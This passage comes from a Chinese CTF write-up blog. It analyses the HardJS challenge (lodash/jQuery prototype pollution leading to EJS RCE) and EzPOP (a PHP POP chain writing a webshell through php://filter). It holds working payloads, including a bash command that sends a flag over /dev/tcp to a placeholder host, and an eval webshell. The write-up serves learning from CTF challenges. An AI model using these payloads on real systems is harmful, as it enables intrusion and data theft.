class="hljs-string">&#x27;/&#x27;</span>requests.<span class="hljs-keyword">get</span>(    <span class="hljs-string">&#x27;http://20bad283-63d2-49d3-b7aa-2f07db4d8241.node4.buuoj.cn:81/core?q=&#x27;</span> + payload)print(requests.<span class="hljs-keyword">get</span>(    <span class="hljs-string">&#x27;http://20bad283-63d2-49d3-b7aa-2f07db4d8241.node4.buuoj.cn:81/?action=lethe&#x27;</span>).text)</code></pre><p>参考：<a href="https://xz.aliyun.com/t/2894">https://xz.aliyun.com/t/2894</a></p>]]></content>
    
    
    <categories>
      
      <category>CRLF注入</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buu（十）</title>
    <link href="/2021/08/20/hjs/"/>
    <url>/2021/08/20/hjs/</url>
    
    <content type="html"><![CDATA[<h1>[XNUCA2019Qualifier]HardJS</h1><h4 id="后端RCE之opts-outputFunctionName"><a class="header-anchor" href="#后端RCE之opts-outputFunctionName">🍭</a>后端RCE之opts.outputFunctionName</h4><p>题目给了源码，是一个node.js的后端，应该是原型链污染的题目，从server.js开始审计：</p><p>有7个路由，其中/get路由下有一段代码</p><pre><code class="hljs n1ql">if(dataList[0].count == 0 )&#123;        res.json(&#123;&#125;)    &#125;else if(dataList[0].count &gt; 5) &#123; // if len &gt; 5 , <span class="hljs-keyword">merge</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">update</span> mysql                console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Merge the recorder in the database.&quot;</span>);         var sql = &quot;<span class="hljs-keyword">select</span> <span class="hljs-symbol">`id`</span>,<span class="hljs-symbol">`dom`</span> <span class="hljs-keyword">from</span>  <span class="hljs-symbol">`html`</span> <span class="hljs-keyword">where</span> userid=? <span class="hljs-string">&quot;;</span><span class="hljs-string">        var raws = await query(sql,[userid]);</span><span class="hljs-string">        var doms = &#123;&#125;</span><span class="hljs-string">        var ret = new Array(); </span><span class="hljs-string"></span><span class="hljs-string">        for(var i=0;i&lt;raws.length ;i++)&#123;</span><span class="hljs-string">            lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));</span><span class="hljs-string"></span><span class="hljs-string">            var sql = &quot;</span><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> <span class="hljs-symbol">`html`</span> <span class="hljs-keyword">where</span> id = ?<span class="hljs-string">&quot;;</span><span class="hljs-string">            var result = await query(sql,raws[i].id);</span><span class="hljs-string">        &#125;</span></code></pre><p>当从数据库中查找出来的数据大于5条时，会调用lodash的defaultsDeep函数将其合并。</p><p>除了<code>/static</code>，<code>/login</code>，<code>/register</code>以外，每个路由在访问时都会经过<code>auth</code>函数进行身份验证：</p><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> auth(req,res,next)&#123;    // var <span class="hljs-keyword">session</span> = req.<span class="hljs-keyword">session</span>;    <span class="hljs-keyword">if</span>(!req.<span class="hljs-keyword">session</span>.<span class="hljs-keyword">login</span> || !req.<span class="hljs-keyword">session</span>.userid )&#123;        res.redirect(<span class="hljs-number">302</span>,&quot;/login&quot;);    &#125; <span class="hljs-keyword">else</span>&#123;        next();    &#125;    &#125;</code></pre><p>auth函数仅通过req.session.login、req.session.userid判断登录，我们只要污染login和userid两个属性，就可以任意登录了。</p><p>从代码可看出本题以ejs库作为模版引擎，找一下可利用点；函数<strong>Template</strong>：</p><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">Template</span>(<span class="hljs-type">text</span>, opts) &#123;  opts = opts || &#123;&#125;;  var <span class="hljs-keyword">options</span> = &#123;&#125;;  this.templateText = <span class="hljs-type">text</span>;  this.mode = <span class="hljs-keyword">null</span>;  this.<span class="hljs-keyword">truncate</span> = <span class="hljs-keyword">false</span>;  this.currentLine = <span class="hljs-number">1</span>;  this.source = <span class="hljs-string">&#x27;&#x27;</span>;  this.dependencies = [];  <span class="hljs-keyword">options</span>.client = opts.client || <span class="hljs-keyword">false</span>;  <span class="hljs-keyword">options</span>.escapeFunction = opts.<span class="hljs-keyword">escape</span> || opts.escapeFunction || utils.escapeXML;  <span class="hljs-keyword">options</span>.compileDebug = opts.compileDebug !== <span class="hljs-keyword">false</span>;  <span class="hljs-keyword">options</span>.<span class="hljs-keyword">debug</span> = !!opts.<span class="hljs-keyword">debug</span>;  <span class="hljs-keyword">options</span>.filename = opts.filename;  <span class="hljs-keyword">options</span>.openDelimiter = opts.openDelimiter || exports.openDelimiter || _DEFAULT_OPEN_DELIMITER;  <span class="hljs-keyword">options</span>.closeDelimiter = opts.closeDelimiter || exports.closeDelimiter || _DEFAULT_CLOSE_DELIMITER;  <span class="hljs-keyword">options</span>.delimiter = opts.<span class="hljs-keyword">delimiter</span> || exports.<span class="hljs-keyword">delimiter</span> || _DEFAULT_DELIMITER;  <span class="hljs-keyword">options</span>.<span class="hljs-keyword">strict</span> = opts.<span class="hljs-keyword">strict</span> || <span class="hljs-keyword">false</span>;  <span class="hljs-keyword">options</span>.context = opts.context;  <span class="hljs-keyword">options</span>.cache = opts.cache || <span class="hljs-keyword">false</span>;  <span class="hljs-keyword">options</span>.rmWhitespace = opts.rmWhitespace;  <span class="hljs-keyword">options</span>.root = opts.root;  <span class="hljs-keyword">options</span>.outputFunctionName = opts.outputFunctionName;  <span class="hljs-keyword">options</span>.localsName = opts.localsName || exports.localsName || _DEFAULT_LOCALS_NAME;  <span class="hljs-keyword">options</span>.views = opts.views;  <span class="hljs-keyword">options</span>.async = opts.async;</code></pre><p>这些变量来自于对象<code>opt</code>，并且这些变量一开始在<code>Object</code>中都为空。所以我们就可以通过对这些变量逐一跟踪，看看哪个拼接到了模板中，那么我们就可以通过污染这些变量，渲染过程由于存在<strong>eval</strong>，从而进行 RCE</p><h4 id="后端RCE-opts-escapeFunction"><a class="header-anchor" href="#后端RCE-opts-escapeFunction">🍭</a>后端RCE||opts.escapeFunction</h4><p>跟踪opts.escapeFunction：</p><pre><code class="hljs ini"><span class="hljs-attr">options.escapeFunction</span> = opts.escape || opts.escapeFunction || utils.escapeXML<span class="hljs-comment">;</span></code></pre><p>出现在Template的原型中的方法：compile</p><pre><code class="hljs arcade">compile: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123; ...  <span class="hljs-keyword">var</span> escapeFn = opts.escapeFunction;</code></pre><p>赋值给了变量<code>escapeFn</code>，跟进，同样在<strong>compile</strong>找到了：</p><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (opts.client) &#123;      <span class="hljs-attribute">src</span> = <span class="hljs-string">&#x27;escapeFn = escapeFn || &#x27;</span> + escapeFn.toString() + <span class="hljs-string">&#x27;;&#x27;</span> + <span class="hljs-string">&#x27;n&#x27;</span> + src;      <span class="hljs-attribute">if</span> (opts.compileDebug) &#123;        <span class="hljs-attribute">src</span> = <span class="hljs-string">&#x27;rethrow = rethrow || &#x27;</span> + rethrow.toString() + <span class="hljs-string">&#x27;;&#x27;</span> + <span class="hljs-string">&#x27;n&#x27;</span> + src;      &#125;    &#125;</code></pre><p>如果<code>opts.client</code>存在，则将<code>escapeFn</code>拼接到<code>src</code>中，然后根据拼接的内容，生成动态函数：</p><pre><code class="hljs php"><span class="hljs-keyword">else</span> &#123;    ctor = <span class="hljs-function"><span class="hljs-keyword">Function</span></span>;&#125;<span class="hljs-function"><span class="hljs-keyword">fn</span> = <span class="hljs-title">new</span> <span class="hljs-title">ctor</span>(<span class="hljs-params">opts.localsName + <span class="hljs-string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src</span>)</span>;</code></pre><p>如果可以控制<code>opts.escapeFunction</code>的内容为恶意代码，即可通过 ejs 模板渲染进行 RCE</p><p>payload：</p><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;notice&quot;</span>,<span class="hljs-attr">&quot;content&quot;</span>:&#123;<span class="hljs-attr">&quot;constructor&quot;</span>:&#123;<span class="hljs-attr">&quot;prototype&quot;</span>:&#123;<span class="hljs-attr">&quot;client&quot;</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">&quot;escapeFunction&quot;</span>:<span class="hljs-string">&quot;1; return process.env.FLAG&quot;</span>&#125;&#125;&#125;&#125;</code></pre><p>通过<code>/add</code>将 json 格式的 payload 传递给服务器</p><p><img src="/2021/08/20/hjs/5.png" alt="5"></p><p>打6次后随便访问一个带有<code>app.render()</code>渲染代码的路由，进行模板渲染：</p><img src="/2021/08/20/hjs/6.png" alt="6" style="zoom:67%;"><h4 id="后端RCE-outputFuncationName"><a class="header-anchor" href="#后端RCE-outputFuncationName">🍭</a>后端RCE||outputFuncationName</h4><p>一样跟到<strong>compile</strong>：</p><pre><code class="hljs kotlin"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.source) &#123;    <span class="hljs-keyword">this</span>.generateSource();    prepended += <span class="hljs-string">&#x27;  var __output = [], __append = __output.push.bind(__output);&#x27;</span> + <span class="hljs-string">&#x27;n&#x27;</span>;    <span class="hljs-keyword">if</span> (opts.outputFunctionName) &#123;        prepended += <span class="hljs-string">&#x27;  var &#x27;</span> + opts.outputFunctionName + <span class="hljs-string">&#x27; = __append;&#x27;</span> + <span class="hljs-string">&#x27;n&#x27;</span>;    &#125;    ...    <span class="hljs-keyword">this</span>.source = prepended + <span class="hljs-keyword">this</span>.source + appended;&#125;</code></pre><p>如果<code>this.source</code>不存在，则执行<code>prepended += '  var ' + opts.outputFunctionName + ' = __append;' + 'n';</code>，将<code>opts.outputFunctionName</code>拼接到变量<code>prepended</code>中，然后末尾又将<code>prepended</code>拼接到<code>this.source</code>。继续跟踪<code>this.source</code>：</p><pre><code class="hljs gradle"><span class="hljs-keyword">if</span> (opts.compileDebug) &#123; ...&#125;<span class="hljs-keyword">else</span>&#123;    src = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">source</span>;&#125;</code></pre><p><code>opts.compileDebug</code>不存在时，将<code>this.source</code>赋值给<code>src</code>，最后一样带入了<code>fn = new ctor(opts.localsName + ', escapeFn, include, rethrow', src);</code>动态函数</p><p>同样构造 payload：</p><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;type&quot;</span>:<span class="hljs-string">&quot;mmp&quot;</span>,<span class="hljs-attr">&quot;content&quot;</span>:&#123;<span class="hljs-attr">&quot;constructor&quot;</span>:&#123;<span class="hljs-attr">&quot;prototype&quot;</span>:&#123;<span class="hljs-attr">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;a=1;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c &quot;</span>echo $FLAG&gt;/dev/tcp/xxxxx/xx<span class="hljs-string">&quot;&#x27;)//&quot;</span>&#125;&#125;&#125;&#125;</code></pre><h4 id="JQuery中-extend污染-前端XXS"><a class="header-anchor" href="#JQuery中-extend污染-前端XXS">🍭</a>JQuery中$.extend污染+前端XXS</h4><h5 id="loadsh-库的原型链污染漏洞"><a class="header-anchor" href="#loadsh-库的原型链污染漏洞">🍭</a>loadsh 库的原型链污染漏洞</h5><pre><code class="hljs javascript">lodash.defaultsDeep(doms,<span class="hljs-built_in">JSON</span>.parse( raws[i].dom ));</code></pre><p>lodash 是一个非常流行的JavaScript 实用原生库，不需要引入其他第三方依赖，此软件包的＜4.17.12版本会受到原型污染的影响。它有一个经典的原型链污染漏洞<code>CVE-2019-10744</code>：</p><p>在Lodash库中defaultsDeep函数可以进行构造函数（constructor）重载，通过构造函数重载的方式可以欺骗添加或修改Object.prototype的属性，这个性质可以被用于原型污染。</p><p>POC</p><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> mergeFn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>).defaultsDeep;<span class="hljs-keyword">const</span> payload = <span class="hljs-string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;a0&quot;: true&#125;&#125;&#125;&#x27;</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>) </span>&#123;    mergeFn(&#123;&#125;, <span class="hljs-built_in">JSON</span>.parse(payload));    <span class="hljs-keyword">if</span> ((&#123;&#125;)[<span class="hljs-string">`a0`</span>] === <span class="hljs-literal">true</span>) &#123;        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Vulnerable to Prototype Pollution via <span class="hljs-subst">$&#123;payload&#125;</span>`</span>);    &#125;  &#125;check();</code></pre><p>漏洞关键触发点在defaultsDeep函数，它将<code>(&#123;&#125;, JSON.parse(payload))</code>merge时，就可能导致原型链污染。使用JSON.parse就是保证合并时能以字典解析，而不是字符串。</p><h5 id="JQuery-原型链污染"><a class="header-anchor" href="#JQuery-原型链污染">🍭</a>JQuery 原型链污染</h5><p>JQuery 是一个Js前端工具库，存在原型链污染漏洞，CVE：<a href="https://www.cvedetails.com/cve/CVE-2019-11358/">CVE-2019-11358</a>， 版本小于3.4.0时</p><p><img src="/2021/08/20/hjs/7.png" alt="7"></p><p><code>$.extend(true,&#123;&#125;,JSON.parse('&#123;&quot;__proto__&quot;:&#123;&quot;aa&quot;:&quot;hello&quot;&#125;&#125;'))</code> Jquery可以用$.extend将两个字典merge，而这也因此污染了原型链。</p><h5 id="分析"><a class="header-anchor" href="#分析">🍭</a>分析</h5><p>前端获取后台数据时调用了<code>$.extent</code>函数merge数据：</p><pre><code class="hljs arcade"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAll</span>(<span class="hljs-params">allNode</span>)</span>&#123;    $.ajax(&#123;        url:<span class="hljs-string">&quot;/get&quot;</span>,        type:<span class="hljs-string">&quot;get&quot;</span>,        async:<span class="hljs-literal">false</span>,        success: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">datas</span>)</span>&#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span> ;i&lt;datas.length; i++)&#123;                $.extend(<span class="hljs-literal">true</span>,allNode,datas[i])            &#125;            <span class="hljs-comment">// console.log(allNode);</span>        &#125;    &#125;)&#125;</code></pre><p>js生成模板时，遍历了hints数组并将hints数组里面的内容写入到对应li标签中。</p><pre><code class="hljs clojure">(<span class="hljs-name">function</span>()&#123;        var hints = &#123;            header : <span class="hljs-string">&quot;自定义内容&quot;</span>,            notice: <span class="hljs-string">&quot;自定义公告&quot;</span>,            wiki : <span class="hljs-string">&quot;自定义wiki&quot;</span>,            button:<span class="hljs-string">&quot;自定义内容&quot;</span>,            message: <span class="hljs-string">&quot;自定义留言内容&quot;</span>        &#125;<span class="hljs-comment">;</span>        for(<span class="hljs-name"><span class="hljs-builtin-name">key</span></span> in hints)&#123;            // console.log(<span class="hljs-name"><span class="hljs-builtin-name">key</span></span>)<span class="hljs-comment">;</span>            element = $(<span class="hljs-string">&quot;li[type=&#x27;&quot;</span>+key+<span class="hljs-string">&quot;&#x27;]&quot;</span>)<span class="hljs-comment">; </span>            if(<span class="hljs-name">element</span>)&#123;                element.find(<span class="hljs-string">&quot;span.content&quot;</span>).html(<span class="hljs-name">hints</span>[key])<span class="hljs-comment">;</span>            &#125;        &#125;    &#125;)()<span class="hljs-comment">;</span></code></pre><p>index.ejs中，含有type属性的li标签除了上面写的五个还有一个logger</p><pre><code class="hljs scala">&lt;li <span class="hljs-class"><span class="hljs-keyword">type</span></span>=<span class="hljs-string">&quot;logger&quot;</span>&gt;          &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;col-sm-12 col-sm-centered&quot;</span>&gt;              &lt;pre <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;am-pre-scrollable&quot;</span>&gt;                  &lt;span <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;am-text-success&quot;</span>&gt;[<span class="hljs-type">Tue</span> <span class="hljs-type">Jan</span> <span class="hljs-number">11</span> <span class="hljs-number">17</span>:<span class="hljs-number">32</span>:<span class="hljs-number">52</span> <span class="hljs-number">9</span>]&lt;/span&gt; &lt;span <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;am-text-danger&quot;</span>&gt;[info]&lt;/span&gt; &lt;span <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;content&quot;</span>&gt;<span class="hljs-type">StoreHtml</span> init success .....&lt;/span&gt;              &lt;/pre&gt;</code></pre><p>思路：污染logger变量，使得hints含有logger属性，从而将logger内容打印到页面中实现XSS，绕过登录验证越权登录admin,覆盖<code>login</code>与<code>userid</code>。</p><p>参考：<a href="https://blog.szfszf.top/tech/javascript-%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93-%e5%88%86%e6%9e%90/">https://blog.szfszf.top/tech/javascript-原型链污染-分析/</a></p><p><a href="https://blog.csdn.net/qq_42181428/article/details/100659865">https://blog.csdn.net/qq_42181428/article/details/100659865</a></p><h1>[EIS 2019]EzPOP</h1><p>题目给了源码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;    <span class="hljs-keyword">protected</span> $store;    <span class="hljs-keyword">protected</span> $key;    <span class="hljs-keyword">protected</span> $expire;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$store, $key = <span class="hljs-string">&#x27;flysystem&#x27;</span>, $expire = <span class="hljs-literal">null</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;key = $key;        <span class="hljs-keyword">$this</span>-&gt;store = $store;        <span class="hljs-keyword">$this</span>-&gt;expire = $expire;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $contents</span>) </span>&#123;        $cachedProperties = array_flip([            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,        ]);        <span class="hljs-keyword">foreach</span> ($contents <span class="hljs-keyword">as</span> $path =&gt; $object) &#123;            <span class="hljs-keyword">if</span> (is_array($object)) &#123;                $contents[$path] = array_intersect_key($object, $cachedProperties); <span class="hljs-comment">//比较两个数组的键名，并返回交集</span>            &#125;        &#125;        <span class="hljs-keyword">return</span> $contents;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;        $cleaned = <span class="hljs-keyword">$this</span>-&gt;cleanContents(<span class="hljs-keyword">$this</span>-&gt;cache);        <span class="hljs-keyword">return</span> json_encode([$cleaned, <span class="hljs-keyword">$this</span>-&gt;complete]); <span class="hljs-comment">//json编码</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;        $contents = <span class="hljs-keyword">$this</span>-&gt;getForStorage();        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, $contents, <span class="hljs-keyword">$this</span>-&gt;expire);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;autosave) &#123;            <span class="hljs-keyword">$this</span>-&gt;save();        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params">$expire</span>)</span>&#123; <span class="hljs-comment">//获取失效时间</span>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) $expire;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> $name</span>) </span>&#123; <span class="hljs-comment">//设置filename</span>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . $name;    &#125;    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params">$data</span>) </span>&#123;         <span class="hljs-keyword">if</span> (is_numeric($data)) &#123;            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) $data;        &#125;        $serialize = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];        <span class="hljs-keyword">return</span> $serialize($data);<span class="hljs-comment">//命令执行</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params">$name, $value, $expire = <span class="hljs-literal">null</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;writeTimes++;        <span class="hljs-keyword">if</span> (is_null($expire)) &#123;            $expire = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];        &#125;        $expire = <span class="hljs-keyword">$this</span>-&gt;getExpireTime($expire);        $filename = <span class="hljs-keyword">$this</span>-&gt;getCacheKey($name); <span class="hljs-comment">//设置filename</span>        $dir = dirname($filename);        <span class="hljs-keyword">if</span> (!is_dir($dir)) &#123;            <span class="hljs-keyword">try</span> &#123;                mkdir($dir, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> $e) &#123;                <span class="hljs-comment">// 创建失败</span>            &#125;        &#125;        $data = <span class="hljs-keyword">$this</span>-&gt;serialize($value);        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;            <span class="hljs-comment">//数据压缩</span>            $data = gzcompress($data, <span class="hljs-number">3</span>);        &#125;        $data = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, $expire) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . $data;        $result = file_put_contents($filename, $data);        <span class="hljs-keyword">if</span> ($result) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;src&#x27;</span>]))&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;$dir = <span class="hljs-string">&quot;uploads/&quot;</span>;<span class="hljs-keyword">if</span> (!is_dir($dir))&#123;    mkdir($dir);&#125;unserialize($_GET[<span class="hljs-string">&quot;data&quot;</span>]);</code></pre><p>这次从下往上看：</p><pre><code class="hljs php-template"><span class="xml">$data = &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span>\n<span class="hljs-comment">//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();<span class="hljs-meta">?&gt;</span></span></span><span class="xml">\n&quot; . $data;</span><span class="xml">$result = file_put_contents($filename, $data);</span></code></pre><p>注意到<code>file_put_contents</code>应该可写webshell，有两个参数，先看filename：</p><pre><code class="hljs elixir"><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$this</span>-&gt;getCacheKey(<span class="hljs-variable">$name</span>);</code></pre><p>在追溯一下</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> $name</span>) </span>&#123;         <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . $name;    &#125;</code></pre><p>所以<code>$filename = options['prefix'].$name</code>,再看data参数：</p><pre><code class="hljs awk"><span class="hljs-variable">$data</span> = <span class="hljs-variable">$this</span>-&gt;serialize(<span class="hljs-variable">$value</span>);<span class="hljs-regexp">//</span>经过自定义的serialize函数处理</code></pre><p>跟进一下</p><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params">$data</span>) </span>&#123;        <span class="hljs-keyword">if</span> (is_numeric($data)) &#123;           <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) $data;       &#125;       $serialize = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>]; <span class="hljs-comment">//表明serialize可控</span>       <span class="hljs-keyword">return</span> $serialize($data);<span class="hljs-comment">//假如$serialize=eval,此处可为eval($data)</span>   &#125;</code></pre><p>然后data还要处理</p><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<span class="hljs-regexp">//</span>可以设定options[<span class="hljs-string">&#x27;data_compress&#x27;</span>]=false，不进入数据压缩这一步            <span class="hljs-regexp">//</span>数据压缩            <span class="hljs-variable">$data</span> = gzcompress(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);        &#125;<span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;</code></pre><p>最后这条处理代码可参考：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">文章</a>绕过，本地测试一下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$expire = <span class="hljs-number">0</span>;$data = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[\&#x27;cmd\&#x27;]);?&gt;&#x27;</span>;$data = <span class="hljs-string">&#x27;aaa&#x27;</span>.base64_encode($data); <span class="hljs-comment">//加3个a是为了补齐base64字节数</span><span class="hljs-keyword">echo</span> $data; <span class="hljs-comment">//aaaPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=</span>$filename = <span class="hljs-string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/shell.php&#x27;</span>;$data = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, $expire) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . $data;$result = file_put_contents($filename, $data);<span class="hljs-keyword">echo</span> $result;</code></pre><p>这段代码中的$data全部用base64解码转化过后再写入文件中，其中前面拼接部分会被强制解码，从而变成一堆乱码。而我们写入的shell（base64编码过的）会解码成正常的木马文件。需要注意的是长度问题，我们需要shell部分和前面加起来的字节数为4的倍数(base64解码时不影响shell部分)。</p><p>然后看一下A类</p><p>一样从<code>__destruct()</code>看起</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;autosave) &#123; <span class="hljs-comment">//此处令autosave=false即可进入进入save()函数</span>            <span class="hljs-keyword">$this</span>-&gt;save();        &#125;    &#125;</code></pre><p>==&gt;</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;        $contents = <span class="hljs-keyword">$this</span>-&gt;getForStorage();        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, $contents, <span class="hljs-keyword">$this</span>-&gt;expire); <span class="hljs-comment">//A类中不存在set()函数，而B类存在，此处为pop链连接点，可令store=new B()</span>    &#125;</code></pre><p>==&gt;</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $contents</span>) </span>&#123; <span class="hljs-comment">//这里可令传入的array为空，则最后return的contents为空</span>        $cachedProperties = array_flip([            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,        ]);        <span 